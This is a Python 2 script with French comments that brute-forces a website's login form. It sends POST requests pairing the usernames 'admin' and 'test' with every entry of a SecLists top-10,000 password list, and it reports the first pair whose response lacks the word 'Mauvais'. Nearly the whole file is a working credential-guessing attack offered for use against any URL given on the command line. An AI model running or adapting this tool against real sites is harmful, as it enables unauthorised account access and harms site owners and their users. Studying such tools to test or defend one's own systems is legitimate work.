#! /usr/bin/env python
# -*-coding: utf-8-*-

import httplib, urllib, re, sys

# ce script permet de faire du bruteforce sur une page d'authentification sur internet

# pseudos à définir par l'utilisateur, ou grâce à une wordlist
pseudos = ['admin', 'test',]

# fichier de mots de passe
passwords_file = '/usr/share/wordlist/SecLists-master/Passwords/10_million_password_list_top_10000.txt'


def bruteforce():
	# fonction permettant de faire du bruteforce sur le site choisi par l'utilisateur

	find = False

	# on charge la wordlist des mots de passe
	passwords = list(open(passwords_file, 'r'))

	# on récupère le nom de domaine et la page concernée
	pageWeb = sys.argv[1].split("/")
	domaine = pageWeb[2]
	page = '/' + pageWeb[3]

	# pour chaque identifiants
	for pseudo in pseudos:

		# et pour chaque mot de passe
		for password in passwords:

			# on encode les informations de la requête post
			params = urllib.urlencode({'log': pseudo, 'mot_de_passe' : password.rstrip()})

			# on affiche le couple pseudo/password qu'on essaie
			print "%s  %s" %(pseudo,password.rstrip())

			# on crée les headers associés
			headers = { "Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain" }

			# on ouvre une connexion avec le site désiré
			conn = httplib.HTTPConnection(domaine, 80)

			# on envoie notre requete POST sur la page souhaitée
			conn.request("POST", page, params, headers)

			# on récupère la réponse du serveur
			reponse = conn.getresponse()

			# si la réponse n'est pas "mauvais mot de passe", on arrête et on renvoie les identifiants associés
			if "Mauvais" not in str(reponse.read()):
				print "=============================="
				print "  Authentification réussie !  "
				print "      %s  %s     " %(pseudo, password)
				print "=============================="

				conn.close()

				find = True

				break
			
			conn.close()

		if find:
			break


if __name__ == "__main__":
	bruteforce()
